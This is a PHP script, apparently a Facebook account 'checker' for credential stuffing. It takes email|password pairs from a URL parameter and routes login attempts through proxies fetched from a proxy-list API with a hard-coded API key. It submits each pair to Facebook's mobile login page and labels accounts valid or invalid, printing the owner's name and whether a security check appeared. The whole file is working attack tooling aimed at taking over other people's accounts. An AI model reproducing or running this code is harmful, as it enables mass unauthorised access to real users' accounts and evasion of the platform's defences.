<?php
set_time_limit(0);
error_reporting(0);

$link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
$link2 = json_decode($link);
$link3 = $link2 ->ip;
$link4 = $link2 ->port;
$proxy = $link3.":".$link4;

class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["lista"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

$a = new cURL();
        $b = $a->post('https://m.facebook.com/login.php?login_attempt=1', 'email='.$email.'&pass='.$senha.'');

if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
               
        if (stristr($b,'Pesquisar no Facebook')) { 
    
     $nome = GetStr($b, 'button_name=logout&amp;button_location=footer&amp;ref_component=mbasic_footer&amp;ref_page=%2Fwap%2Fhome.php&amp;refid=7">Sair (',')</a>');

 echo "<span class='label label-success'>#APROVADA</span> → $email|$senha | Nome: $nome | Verificação: Não  <span class='label label-warning'>#BlackStar</span><br>";
 
    }else if (stristr($b,'Verificação de segurança')) {
  
  echo "<span class='label label-success'>#APROVADA</span> → $email|$senha | Verificação: Sim  <span class='label label-warning'>#BlackStar©</span> <br>";
  
        }else{

        echo "#REPROVADA → $email|$senha|  <span class='label label-warning'>#BlackStar©</span> <br>";
   

}

  


?>